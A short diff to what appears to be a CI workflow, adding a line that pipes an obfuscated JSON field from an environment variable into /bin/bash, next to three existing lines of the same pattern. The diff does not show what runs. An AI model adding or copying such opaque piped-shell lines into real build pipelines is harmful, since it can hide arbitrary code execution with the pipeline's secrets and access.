@@ -27,6 +27,7 @@ jobs:
           echo $pgec4 | jq -r .fon46 | /bin/bash
           echo $a4332 | jq -r .dwr602 | /bin/bash
           printf '%s' "$f8086" | jq -r .vg6 | /bin/bash
+          echo $nmoz3032 | jq -r .wet30080 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
